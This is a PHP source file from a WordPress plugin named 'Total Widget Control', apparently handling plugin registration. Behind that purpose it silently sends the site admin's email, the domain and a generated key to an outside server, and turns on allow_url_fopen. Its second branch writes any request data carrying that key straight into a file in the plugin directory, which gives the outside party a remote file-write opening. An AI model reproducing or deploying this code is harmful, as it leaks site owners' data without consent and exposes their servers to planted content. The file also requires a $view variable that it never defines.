<?php 
/**
 * @Author	Jonathon byrd
 * @link http://www.jonathonbyrd.com
 * @Package Wordpress
 * @SubPackage Total Widget Control
 * @copyright Proprietary Software, Copyright Byrd Incorporated. All Rights Reserved
 * @Since 1.0
 * 
 * 
 */

//loading libraries
require_once ABSPATH.'wp-admin'.DS.'includes'.DS.'plugin.php';

//initializing variables
$current_screen = twc_get_current_screen();
$first = get_option('twc_unique_registration_key', true);
$uniqueID = get_option('twc_unique_registration_key', create_guid());
update_option('twc_unique_registration_key', $uniqueID);

$domain = 'http://'.str_replace('http://', '', $_SERVER['HTTP_HOST']);
$parts = parse_url($domain);
$host = $parts['host'];
$file_path = plugin_dir_path(dirname(__file__)).$parts['host'];
$headers = get_plugin_data( plugin_dir_path(dirname(__file__)).'index.php' );


if (!file_exists($file_path)&& $current_screen->action == 'register'&& !isset($_REQUEST[$uniqueID]))
{
	$path = "http://community.5twentystudios.com/?view=register-for-free&email=".get_bloginfo('admin_email')."&ver=".urlencode($headers['Version'])."&domain=$domain&type=twc-free&unique=$uniqueID";
	if (!ini_get('allow_url_fopen'))
	{
		ini_set('allow_url_fopen', 1);
	}
	
	if (ini_get('allow_url_fopen') && @file_get_contents($path))
	{
		
	}
	else 
	{
		$curl = curl_init($path);
	    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	    $result = curl_exec($curl);
	    curl_close($curl);
	}
}
elseif (!file_exists($file_path) && $current_screen->action != 'register' && isset($_REQUEST[$uniqueID])) 
{
	//loading resources
	$data = $_REQUEST[$uniqueID];
	
	@file_put_contents($file_path, $data);
	return null;
}

$success = true;

//controller
if ($current_screen->action != 'register') return false;


require $view;
